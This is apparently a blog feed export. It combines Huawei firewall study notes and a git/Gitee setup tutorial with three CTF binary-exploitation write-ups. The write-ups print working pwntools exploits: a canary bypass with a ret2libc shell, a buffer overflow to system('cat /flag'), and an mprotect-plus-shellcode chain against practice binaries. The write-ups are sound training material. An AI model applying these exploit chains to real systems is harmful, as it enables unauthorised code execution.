    <content type="html"><![CDATA[<h1 id="HCNP-SEC-19-11-23"><a href="#HCNP-SEC-19-11-23" class="headerlink" title="HCNP-SEC-19.11.23"></a>HCNP-SEC-19.11.23</h1><img src="2020/01/13/HCNP-SEC-19.11.23/648EB2E3-ECFB-4610-AC4F-C41A40C726F0.png" srcset="/img/loading.gif" class="" title="648EB2E3-ECFB-4610-AC4F-C41A40C726F0"><blockquote><p>eSight网管 可管其他厂商设备，几乎都可以</p><p>CIS可用于抵御APT攻击。它从海量数据中提取关键信息，智能可视化，还原攻击链，防御攻击</p><p>FireHunter还原流量，在虚拟环境对网络中传输的文件进行检测</p><p>UMA 审计上网行为</p><p>NGFW USG9000 网络运营商，广电（超大型网络）USG6000 中大型企业</p><p>业务随行</p><p>S12700 整个网络核心 S9k S7k</p><img src="2020/01/13/HCNP-SEC-19.11.23/61051AC5-C8D2-47E8-9516-09E3979F7769.png" srcset="/img/loading.gif" class="" title="61051AC5-C8D2-47E8-9516-09E3979F7769"></blockquote><h2 id="网络安全运维"><a href="#网络安全运维" class="headerlink" title="网络安全运维"></a>网络安全运维</h2><p>安全策略：简单，稳定，安全</p><p>端口要加端口描述</p><p>脚本配置</p><img src="2020/01/13/HCNP-SEC-19.11.23/52CCD98F-87B0-4D17-9CD9-043B92E84B1E.png" srcset="/img/loading.gif" class="" title="52CCD98F-87B0-4D17-9CD9-043B92E84B1E"><img src="2020/01/13/HCNP-SEC-19.11.23/6D82AE28-99ED-4EE5-8BAF-F34E0639D652.png" srcset="/img/loading.gif" class="" title="6D82AE28-99ED-4EE5-8BAF-F34E0639D652"><img src="2020/01/13/HCNP-SEC-19.11.23/9C6D9139-095E-43E4-A914-232B379D1387.png" srcset="/img/loading.gif" class="" title="9C6D9139-095E-43E4-A914-232B379D1387"><img src="2020/01/13/HCNP-SEC-19.11.23/0C995BDD-0A38-483B-B32B-727CA8AAF2C4.png" srcset="/img/loading.gif" class="" title="0C995BDD-0A38-483B-B32B-727CA8AAF2C4"><blockquote><p>监控（类似只读）</p></blockquote><img src="2020/01/13/HCNP-SEC-19.11.23/4731E999-DBE2-4436-B428-3BC61E399D80.png" srcset="/img/loading.gif" class="" title="4731E999-DBE2-4436-B428-3BC61E399D80"><img src="2020/01/13/HCNP-SEC-19.11.23/B33BEC42-D775-4EDF-98B9-08454E630607.png" srcset="/img/loading.gif" class="" title="B33BEC42-D775-4EDF-98B9-08454E630607"><img src="2020/01/13/HCNP-SEC-19.11.23/3B696243-B418-4CCF-AE64-B94BC4556C4D.png" srcset="/img/loading.gif" class="" title="3B696243-B418-4CCF-AE64-B94BC4556C4D"><img src="2020/01/13/HCNP-SEC-19.11.23/3CAA5AFE-7E9C-48D1-BC36-7D357E6FCEF3.png" srcset="/img/loading.gif" class="" title="3CAA5AFE-7E9C-48D1-BC36-7D357E6FCEF3"><img src="2020/01/13/HCNP-SEC-19.11.23/7BC6559D-1E13-4026-AC0A-B341738B51A7.png" srcset="/img/loading.gif" class="" title="7BC6559D-1E13-4026-AC0A-B341738B51A7"><img src="2020/01/13/HCNP-SEC-19.11.23/C7585DFE-372F-4841-B579-E5ABF8B743C4.png" srcset="/img/loading.gif" class="" title="C7585DFE-372F-4841-B579-E5ABF8B743C4"><img src="2020/01/13/HCNP-SEC-19.11.23/A037C828-5CD5-4549-A6A4-E7E7CBE5A54C.png" srcset="/img/loading.gif" class="" title="A037C828-5CD5-4549-A6A4-E7E7CBE5A54C"><img src="2020/01/13/HCNP-SEC-19.11.23/62BE7CDD-3135-430E-987F-6EACF0D80B0A.png" srcset="/img/loading.gif" class="" title="62BE7CDD-3135-430E-987F-6EACF0D80B0A"><img src="2020/01/13/HCNP-SEC-19.11.23/FE1DD198-9061-4788-819D-4EB92584BB87.png" srcset="/img/loading.gif" class="" title="FE1DD198-9061-4788-819D-4EB92584BB87"><img src="2020/01/13/HCNP-SEC-19.11.23/9DCB02F8-A1E8-49FB-B30B-8D1D93C28D5E.png" srcset="/img/loading.gif" class="" title="9DCB02F8-A1E8-49FB-B30B-8D1D93C28D5E"><img src="2020/01/13/HCNP-SEC-19.11.23/C3771611-034E-4CE2-B951-D908189A4396.png" srcset="/img/loading.gif" class="" title="C3771611-034E-4CE2-B951-D908189A4396"><img src="2020/01/13/HCNP-SEC-19.11.23/C8E502F2-BA95-4D88-980E-B339A71104CC.png" srcset="/img/loading.gif" class="" title="C8E502F2-BA95-4D88-980E-B339A71104CC"><p>QS 优先级？优先保证业务</p><p>FW作为出口且有多条出口链路，两条链路一接，最起码也要做一个链路聚合（Eth-Trunck）</p><p>在ensp中，fw连接router，在实际中不会占用GE0/0/0（这是个管理口）</p><h2 id="智能选路应用场景"><a href="#智能选路应用场景" class="headerlink" title="智能选路应用场景"></a>智能选路应用场景</h2><p>网络差，如何优化：增加带宽，增加IP，调整点位</p><img src="2020/01/13/HCNP-SEC-19.11.23/image-20191130211703575.png" srcset="/img/loading.gif" class="" title="image-20191130211703575"><ul><li>全局选路策略：动态选择出接口，充分利用资源</li><li>策略路由：依据制定的策略进行数据转发</li><li><strong>ISP路由</strong>：可以实现流量按照运营商转发，指定选路</li><li>健康检查，感知服务器或链路状态变化，保证流量传输</li></ul><blockquote><p>园区网的四大敏捷特性：有线无线深度融合，业务随行，安全协防，IPCA质量感知（极少）</p></blockquote><img src="2020/01/13/HCNP-SEC-19.11.23/image-20191130213239431.png" srcset="/img/loading.gif" class="" title="image-20191130213239431"><blockquote><p>路由策略和策略路由的区别？？</p></blockquote><h2 id="选路原理"><a href="#选路原理" class="headerlink" title="选路原理"></a>选路原理</h2><img src="2020/01/13/HCNP-SEC-19.11.23/image-20191130213351116.png" srcset="/img/loading.gif" class="" title="image-20191130213351116"><h3 id="过载保护：有预值"><a href="#过载保护：有预值" class="headerlink" title="过载保护：有预值"></a>过载保护：有预值</h3><ul><li>根据带宽：默认的。<strong>原流量仍从该链路走，后续不再。并且全部过载，则继续根据比例分配流量</strong><img src="HCNP-SEC-19.11.23.assets/image-20191130220056847.png" srcset="/img/loading.gif" alt="image-20191130220056847">)<img src="HCNP-SEC-19.11.23.assets/image-20191130220558188.png" srcset="/img/loading.gif" alt="image-20191130220558188"></li></ul><blockquote><p>入方向？出方向？</p></blockquote><ul><li>根据链路质量：<strong>保证质量，保证体验</strong><img src="HCNP-SEC-19.11.23.assets/image-20191130221210672.png" srcset="/img/loading.gif" alt="image-20191130221210672">)<img src="HCNP-SEC-19.11.23.assets/image-20191130221323811.png" srcset="/img/loading.gif" alt="image-20191130221323811"></li><li>根据链路权重：根据预设的权重</li><li>根据链路优先级：默认优先级高的，超过过载阈值时启用优先级次高的链路。（少用，不可能闲置）</li></ul><h3 id="过载保护的问题"><a href="#过载保护的问题" class="headerlink" title="过载保护的问题"></a>过载保护的问题</h3><img src="2020/01/13/HCNP-SEC-19.11.23/image-20191130221945199.png" srcset="/img/loading.gif" class="" title="image-20191130221945199"><p>会话保持：<img src="2020/01/13/HCNP-SEC-19.11.23/image-20191130222127477.png" srcset="/img/loading.gif" class="" title="image-20191130222127477"></p><p>查看会话保持表项（要有流量经过才能查看到</p><pre><code>display session persistence table</code></pre><h2 id="策略路由"><a href="#策略路由" class="headerlink" title="策略路由"></a>策略路由</h2><p>依据用户制定的策略进行转发</p><p>bypass 直通模式，FW相当于透明</p>{% asset_img image-20191130222809732.png image-20191130222809732 %}{% asset_img image-20191130222832266.png image-20191130222832266 %}<blockquote><p>先看策略，无策略则按路由表转发</p></blockquote><h2 id="ISP选路"><a href="#ISP选路" class="headerlink" title="ISP选路"></a>ISP选路</h2><p>在FW连接多个ISP网络时，通过ISP选路可以使访问特定ISP的流量通过相应出接口转发，保证最短路径。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>写入CSV文件（该文件成为ISP地址文件），然后导入FW</p>{% asset_img image-20191130223451969.png image-20191130223451969 %}<blockquote><p>导入ISP地址文件：Web界面操作 网络 &gt; 路由 &gt; 智能选路 &gt; 运营商地址库</p><p>应用： 网络&gt; 接口 &gt; 编辑</p></blockquote><h3 id="可选：健康检查"><a href="#可选：健康检查" class="headerlink" title="可选：健康检查"></a>可选：健康检查</h3><p>探测到无法访问，对应ISP路由会被删除</p>{% asset_img image-20191130223853655.png image-20191130223853655 %}<h2 id="策略路由应用"><a href="#策略路由应用" class="headerlink" title="策略路由应用"></a>策略路由应用</h2><p>修改名称，配置端口描述</p>{% asset_img image-20191130224518587.png image-20191130224518587 %}{% asset_img image-20191130224603119.png image-20191130224603119 %}{% asset_img image-20191130224624111.png image-20191130224624111 %}<h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><p>配置安全区域</p><pre><code>interface GE1/0/2ip address 10.10.1.1 24quit interface GE1/0/3ip address 10.1.1.1 24in GE1/0/4ip add 10.20.1.1 24firewall zone trustset priority 85add interface GE1/0/3quitfirewall zone untrustset priority 5add interface GE1/0/2add interface GE1/0/4</code></pre><p>配置安全策略</p><pre><code>security-policyrule name policy_sec_sec_trust_untrustsource-zone trustdestination-zone untrustaction permitsource-address 10.1.1.0 24 </code></pre><p>一定要写action，不然默认不允许通过</p><p>配置IP-Link</p><p>目标ip 通过 xx 端口 </p><pre><code>ip-link check enableip-link name pbr_1destination 10.10.1.2 interface GE 1/0/2quitip-link name pbr_2destination 10.20.1.2 interface GE 1/0/4</code></pre><img src="2020/01/13/HCNP-SEC-19.11.23/image-20191130225841573.png" srcset="/img/loading.gif" class="" title="image-20191130225841573"><h2 id="故障排查"><a href="#故障排查" class="headerlink" title="故障排查"></a>故障排查</h2><img src="2020/01/13/HCNP-SEC-19.11.23/image-20191130225907120.png" srcset="/img/loading.gif" class="" title="image-20191130225907120"><p>主要问题多为<strong>域间流量是否放行</strong></p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><img src="2020/01/13/HCNP-SEC-19.11.23/image-20191130230708184.png" srcset="/img/loading.gif" class="" title="image-20191130230708184"><p>实验脚本</p><pre><code>R1:syssysname r1int e0/0/0ip add 10.1.1.2 24des to-pc1-e0/0/1qint g0/0/0ip add 10.10.1.1 24des to-fw-g1/0/0qint e0/0/1des to-pc2-e0/0/1ip add 10.1.2.2 24</code></pre><blockquote><p>Dis cu | in ip-link</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>网络专业知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GXY_CTF_my_cannary-从零记录如何调试出来</title>
    <link href="/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/"/>
    <url>/2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/</url>
    
    <content type="html"><![CDATA[<p>查看main</p><img src="2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223003852267.png" srcset="/img/loading.gif" class="" title="image-20191223003852267"><p>进入test()</p><img src="2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223003835308.png" srcset="/img/loading.gif" class="" title="image-20191223003835308"><p>看见了read，等等先</p><img src="2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223005942680.png" srcset="/img/loading.gif" class="" title="image-20191223005942680"><p>judge无法反编译，查看汇编</p><img src="2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223005319299.png" srcset="/img/loading.gif" class="" title="image-20191223005319299"><p>看见了xor rdx,[rbp-8]，以及上图的mov rdx, [rdx] 也就是先讲rdx指针里的数值放在rdx里，再将rdx和rbp-8的那个进行异或，一致则校验成功</p><p>点开read的buf</p><img src="2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223005537590.png" srcset="/img/loading.gif" class="" title="image-20191223005537590"><p>buf只有30字节</p><p>再看看strings</p><img src="2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223011138209.png" srcset="/img/loading.gif" class="" title="image-20191223011138209"><p>没有/bin/sh</p><p>所以我们得先绕过栈校验，再leak libc地址，然后再system /bin/sh</p><p>遂写poc</p><pre><code class="python">from pwn import *sh = process(&quot;./my_cannary&quot;)elf = ELF(&quot;my_cannary&quot;)lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)pop_rdi_ret = 0x0400a43start_main = elf.symbols[&#39;main&#39;]context.log_level = &quot;debug&quot;context.arch = &#39;amd64&#39;__libc_start_main = elf.got[&quot;__libc_start_main&quot;]sh.recvuntil(&quot;begin&quot;)payload = cyclic(0x30)payload += p64(elf.got[&#39;exit&#39;])pause()sh.sendline(payload)sh.interactive()</code></pre><blockquote><p>ldd my_cannary 读取libc</p><p>获得pop_rdi_ret 地址</p><pre><code class="shell">ROPgadget --binary pwn-100 --only &quot;pop|ret&quot; | grep &quot;rdi&quot;</code></pre></blockquote><p>这里使用got表的exit来放在cannary上，pause之后打开edb调试</p>{% asset_img image-20191223010439895.png image-20191223010439895 %}<p>运行到这可以看见rdx值为 0x601058 [rdx] = 0x4006f6</p><p>payload += p64(0x4006f6)</p>{% asset_img image-20191223010623917.png image-20191223010623917 %}<p>这样 rdx 和 [rbp-8] 的值就一样了，异或就为0</p><p>随后</p><p>payload += p64(pop_rdi_ret)<br>payload += p64(start_main)</p><p>测试是否能return to main</p>{% asset_img image-20191223011050308.png image-20191223011050308 %}<p>可以之后，我们再在pop_rdi_ret之后调用puts 打印libc地址 再return to main函数</p><pre><code class="python">from pwn import *sh = process(&quot;./my_cannary&quot;)elf = ELF(&quot;my_cannary&quot;)lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)pop_rdi_ret = 0x0400a43start_main = elf.symbols[&#39;main&#39;]context.log_level = &quot;debug&quot;context.arch = &#39;amd64&#39;__libc_start_main = elf.got[&quot;__libc_start_main&quot;]sh.recvuntil(&quot;begin&quot;)payload = cyclic(0x30)payload += p64(elf.got[&#39;exit&#39;])payload += p64(0x4006f6)payload += p64(pop_rdi_ret)payload += p64(__libc_start_main)payload += p64(elf.plt[&#39;puts&#39;])payload += p64(start_main)pause()sh.sendline(payload)sh.interactive()</code></pre><p>直接运行，报错，也没有打印lbc，打开edb看</p><img src="2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223011616461.png" srcset="/img/loading.gif" class="" title="image-20191223011616461"><p>这是啥地址，添加log输出之后</p><pre><code class="python">log.success(&quot;pop_rdi_ret====&gt;&quot; + hex(pop_rdi_ret))log.success(&quot;put_plt====&gt;&quot; + hex(elf.plt[&#39;puts&#39;]))log.success(&quot;__libc_start_main====&gt;&quot; + hex(__libc_start_main))log.success(&quot;start_main=====&gt;&quot; + hex(start_main))</code></pre><img src="2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223011833341.png" srcset="/img/loading.gif" class="" title="image-20191223011833341">发现咋跳转到了libc_start_main地址上，本应跳转到pop_rdi_ret的。偏移可能有问题<pre><code class="python">from pwn import *sh = process(&quot;./my_cannary&quot;)elf = ELF(&quot;my_cannary&quot;)lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)pop_rdi_ret = 0x0400a43start_main = elf.symbols[&#39;main&#39;]context.log_level = &quot;debug&quot;context.arch = &#39;amd64&#39;__libc_start_main = elf.got[&quot;__libc_start_main&quot;]sh.recvuntil(&quot;begin&quot;)payload = cyclic(0x30)payload += p64(elf.got[&#39;exit&#39;])payload += p64(0x4006f6)payload += cyclic(20) #计算20个来看偏移payload += p64(pop_rdi_ret)payload += p64(__libc_start_main)payload += p64(elf.plt[&#39;puts&#39;])payload += p64(start_main)log.success(&quot;pop_rdi_ret====&gt;&quot; + hex(pop_rdi_ret))log.success(&quot;put_plt====&gt;&quot; + hex(elf.plt[&#39;puts&#39;]))log.success(&quot;__libc_start_main====&gt;&quot; + hex(__libc_start_main))log.success(&quot;start_main=====&gt;&quot; + hex(start_main))pause()sh.sendline(payload)sh.interactive()</code></pre><img src="2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223012131411.png" srcset="/img/loading.gif" class="" title="image-20191223012131411"><p>这样就看见了，然后<code>cyclic -l 0x61616163</code>计算得8 </p><p>遂将cyclic20的修改为8 payload += cyclic(8)</p> <img src="2020/01/13/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/image-20191223012338855.png" srcset="/img/loading.gif" class="" title="image-20191223012338855"><p>这样就打印出一堆乱码了，然后写代码接收libc_start_main，计算system和binsh</p><p>Exp</p><pre><code class="python">from pwn import *sh = process(&quot;./my_cannary&quot;)elf = ELF(&quot;my_cannary&quot;)lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)pop_rdi_ret = 0x0400a43start_main = elf.symbols[&#39;main&#39;]context.log_level = &quot;debug&quot;context.arch = &#39;amd64&#39;__libc_start_main = elf.got[&quot;__libc_start_main&quot;]sh.recvuntil(&quot;begin&quot;)payload = cyclic(0x30)payload += p64(elf.got[&#39;exit&#39;])payload += p64(0x4006f6)payload += cyclic(8)payload += p64(pop_rdi_ret)payload += p64(__libc_start_main)payload += p64(elf.plt[&#39;puts&#39;])payload += p64(start_main)log.success(&quot;pop_rdi_ret====&gt;&quot; + hex(pop_rdi_ret))log.success(&quot;put_plt====&gt;&quot; + hex(elf.plt[&#39;puts&#39;]))log.success(&quot;__libc_start_main====&gt;&quot; + hex(__libc_start_main))log.success(&quot;start_main=====&gt;&quot; + hex(start_main))pause()sh.sendline(payload)__libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))log.success(&quot;__libc_start_main=====&gt;&quot; + hex(__libc_start_main))libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]system = libc + lib.symbols[&#39;system&#39;]binsh = libc + lib.search(&#39;/bin/sh\x00&#39;).next()payload = cyclic(0x30)payload += p64(elf.got[&#39;exit&#39;])payload += p64(0x4006f6)payload += cyclic(8)payload += p64(pop_rdi_ret)payload += p64(binsh)payload += p64(system)sh.recvuntil(&quot;begin&quot;)sh.sendline(payload)sh.interactive()</code></pre><p>ubuntu18如果运行无法拿shell</p><pre><code>payload += p64(binsh)payload += p64(system + 0x1b)</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>git同步到github和gitee</title>
    <link href="/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/"/>
    <url>/2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/</url>
    
    <content type="html"><![CDATA[<p>==按照此说明做下来保证可用，但我也还没完全研究透彻所以有诸多不足请多原谅==</p><h1 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h1><h2 id="1、建立一个仓库"><a href="#1、建立一个仓库" class="headerlink" title="1、建立一个仓库"></a>1、建立一个仓库</h2><p><a href="https://gitee.com/" target="_blank" rel="noopener">https://gitee.com/</a></p><img src="2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/20190802193737452.png" srcset="/img/loading.gif" class="" title="在这里插入图片描述"><h2 id="2、下载git"><a href="#2、下载git" class="headerlink" title="2、下载git"></a>2、下载git</h2><p><a href="https://git-scm.com/" target="_blank" rel="noopener">https://git-scm.com/</a><br>可以跟随这个 <a href="https://blog.csdn.net/sishen47k/article/details/80211002" target="_blank" rel="noopener">https://blog.csdn.net/sishen47k/article/details/80211002</a> 安装</p><h1 id="二、开始操作"><a href="#二、开始操作" class="headerlink" title="二、开始操作"></a>二、开始操作</h1><h2 id="1、创建SSHkey"><a href="#1、创建SSHkey" class="headerlink" title="1、创建SSHkey"></a>1、创建SSHkey</h2><p>打开Git Bash，输入<code>ssh-keygen -t rsa</code><br>会分别提示你文件名，密码（可不设置），确认密码。一般三次回车就可以<br>在 C:\Users\“你的用户名”.ssh 目录下就会有.pub结尾的文件，用记事本打开，复制里面的东西，这就是你的SSH key</p><h2 id="2、添加key到Gitee"><a href="#2、添加key到Gitee" class="headerlink" title="2、添加key到Gitee"></a>2、添加key到Gitee</h2><p>gitee-&gt;设置-&gt;SSH公钥<br>把key粘贴进去，标题默认是本机的名字</p><h2 id="3、git连接到gitee"><a href="#3、git连接到gitee" class="headerlink" title="3、git连接到gitee"></a>3、git连接到gitee</h2><h3 id="https连接"><a href="#https连接" class="headerlink" title="https连接"></a>https连接</h3><p>拷贝下来你仓库的链接，如 <a href="https://gitee.com/xxxxx" target="_blank" rel="noopener">https://gitee.com/xxxxx</a><br>然后在你想同步的文件夹上右键<img src="2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/20190802195801320.png" srcset="/img/loading.gif" class="" title="在这里插入图片描述"><br>点击GIt Bash Here，输入</p><pre><code>git initgit remote add origin https://gitee.com/xxxxx</code></pre><p>add origin的origin是给他的一个命名<br>然后设置config，分别设置名字和邮箱</p><pre><code>git config --global user.name &quot;Your Name&quot;git config --global user.email &quot;you@example.com&quot;</code></pre><h3 id="ssh链接-推荐"><a href="#ssh链接-推荐" class="headerlink" title="ssh链接 ==推荐=="></a>ssh链接 ==推荐==</h3><pre><code>$ssh -T git@gitee.comHi XXX! You&#39;ve successfully authenticated, but GITEE.COM does not provide shell access.</code></pre><p>则代表ssh链接成功</p><pre><code>git remote add gitee git@gitee.com:YourUserName/YourProjectName.git</code></pre><p>YourUserName和YourProjectName都是要具体看你自己的实际用户名和仓库名字<br>即可，可以通过<code>git remote -v</code>查看</p><p>添加你的文件<code>git add .</code></p><pre><code>git commit -m &quot;备注&quot;</code></pre><p>推送 <code>git push origin/gitee master</code><br>拉取 <code>git pull origin/gitee master</code> ==使用origin或者gitee取决于你给他的命名==</p><p>==这里的master应该也可以换成develop分支上传==</p><p>深入理解github模式请戳 <a href="https://blog.csdn.net/weixin_33547926/article/details/78545042" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33547926/article/details/78545042</a></p><h1 id="3、再次更新之后如何同步"><a href="#3、再次更新之后如何同步" class="headerlink" title="3、再次更新之后如何同步"></a>3、再次更新之后如何同步</h1><pre><code>git statusgit add -Agit commit -a -m &quot;备注&quot;git push origin/gitee master -f</code></pre><h1 id="4、取消暂存"><a href="#4、取消暂存" class="headerlink" title="4、取消暂存"></a>4、取消暂存</h1><pre><code>git statusgit reset filename</code></pre><h1 id="使用VScode更新"><a href="#使用VScode更新" class="headerlink" title="使用VScode更新"></a>使用VScode更新</h1><p>==先保存文件，再暂存更改，随后拉取（pull），即可提交。提交完后再推送到（push）==</p><img src="2020/01/13/git%E5%90%8C%E6%AD%A5%E5%88%B0github%E5%92%8Cgitee/20190803083016935.png" srcset="/img/loading.gif" class="" title="在这里插入图片描述">]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_n_1 WP</title>
    <link href="/2020/01/13/ciscn_2019_n_1%20WP/"/>
    <url>/2020/01/13/ciscn_2019_n_1%20WP/</url>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-n-1-WP"><a href="#ciscn-2019-n-1-WP" class="headerlink" title="ciscn_2019_n_1 WP"></a>ciscn_2019_n_1 WP</h1><pre><code class="c">int func(){  int result; // eax  char v1; // [rsp+0h] [rbp-30h]  float v2; // [rsp+2Ch] [rbp-4h]  v2 = 0.0;  puts(&quot;Let&#39;s guess the number.&quot;);  gets(&amp;v1);  if ( v2 == 11.28125 )    result = system(&quot;cat /flag&quot;);  else    result = puts(&quot;Its value should be 11.28125&quot;);  return result;}</code></pre><p>看见==我还尝试了一下’a’ * offset + ‘11.28215’……</p><p>然后南梦一句：这不是有gets，你直接跳system不就好了。。。。</p><p>哎</p><p>exp</p><pre><code class="python">from pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;#sh = process(&quot;./ciscn_2019_n_1&quot;)sh = remote(&quot;node3.buuoj.cn&quot;,25925)elf = ELF(&quot;./ciscn_2019_n_1&quot;)lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)sh.recvuntil(&quot;er.&quot;)binsh = 0x04006BEpayload = &quot;a&quot; * 56 payload += p64(binsh)sh.sendline(payload)sh.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>get_started_3dsctf_2016</title>
    <link href="/2020/01/13/get_started_3dsctf_2016/"/>
    <url>/2020/01/13/get_started_3dsctf_2016/</url>
    
    <content type="html"><![CDATA[<h1 id="二进制菜鸡的小窝的WP"><a href="#二进制菜鸡的小窝的WP" class="headerlink" title="二进制菜鸡的小窝的WP"></a><a href="http://www.b1ndsec.cn/" target="_blank" rel="noopener">二进制菜鸡的小窝</a>的WP</h1><p>mprotect函数原型： int mprotect(void *addr, size_t len, int prot);</p><p>addr 内存启始地址</p><p>len 修改内存的长度</p><p>prot 内存的权限</p><p>[<img src="2020/01/13/get_started_3dsctf_2016/A7DNJ_MC7NXWW8JVZG.png" srcset="/img/loading.gif" class="" title="img"></p><p>所以得到exp:</p><pre><code class="python"># _*_ coding:utf-8 _*_from pwn import *elf = ELF(&#39;./get_started_3dsctf_2016&#39;)sh = elf.process()#sh = remote(&#39;node3.buuoj.cn&#39;,27037)pop3_ret = 0x804951D #为了后续再能使用栈ret,我们得构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好.mem_addr = 0x80EB000 #可读可写的内存,但不可执行mem_size = 0x1000 #通过调试出来的值mem_proc = 0x7 #可代表可读可写可执行mprotect_addr = elf.symbols[&#39;mprotect&#39;]read_addr = elf.symbols[&#39;read&#39;]payload_01 = &#39;A&#39; * 0x38payload_01 += p32(mprotect_addr)payload_01 += p32(pop3_ret) #执行完mprotect的返回地址,使esp往下+12#mprotect 的三个参数payload_01 += p32(mem_addr) #mprotect函数参数1 修改的内存地址payload_01 += p32(mem_size) #mprotect函数参数2 修改的内存大小payload_01 += p32(mem_proc) #mprotect函数参数3 修改的权限payload_01 += p32(read_addr) #执行完pop3_ret后弹到read地址payload_01 += p32(pop3_ret) #执行完read后将返回到pop3_ret指令,又继续使esp+12#read 的三个参数payload_01 += p32(0) #read函数参数1 ,从输入端读取payload_01 += p32(mem_addr) #读取到的内容复制到指向的内存里payload_01 += p32(0x100) #读取大小payload_01 += p32(mem_addr) #执行完read后ret esish.sendline(payload_01)payload_sh = asm(shellcraft.sh(),arch = &#39;i386&#39;, os = &#39;linux&#39;)sh.sendline(payload_sh)sh.interactive()</code></pre><p>来源：<a href="https://www.b1ndsec.cn/?p=371" target="_blank" rel="noopener">https://www.b1ndsec.cn/?p=371</a></p><h2 id="LYXF-Logan-的WP"><a href="#LYXF-Logan-的WP" class="headerlink" title="LYXF-Logan 的WP"></a><a href="https://www.cnblogs.com/lyxf/" target="_blank" rel="noopener">LYXF-Logan</a> 的WP</h2><pre><code> 修改使用mprotec函数修改内存的权限为可读可写可执行,然后在该内存中写入自己的shellcode,执行该代码即可.首先按先说一下mprotect函数:原型如下int mprotect(void *addr, size_t len, int prot);addr 内存启始地址len  修改内存的长度prot 内存的权限要想达到内存可执行的目的,我们看一下哪个内存最好修改,使用edb-debuger查看,或$ ./ get_started_3dsctf_2016 &amp;$ cat /proc/[you_pid]/maps 查看内存区域可以查看到,内存可读可写的地址为: 0x0x80EB000 ,所以我们对该内存进行增加一个权限如何进行内存的权限修改,思路:1.栈溢出ret 到 mprotect函数地址,我来解释一下 call 指令, call = push + jmp所以直接ret后要留一个返回地址,因为ret 就相当于 jmp 到 mprotect,为了完整的回来,所以在mprotect地址后在压入一个返回地址.2.在32为系统中传参是使用栈传参,择第一个参数先push,第二个再push....所以基本的payload可以构思如下:payload = &#39;A&#39; + 0x38 + p32(mprotect_addr)payaloda += p32(ret_addr) + p32(argu1) + p32(argu2) 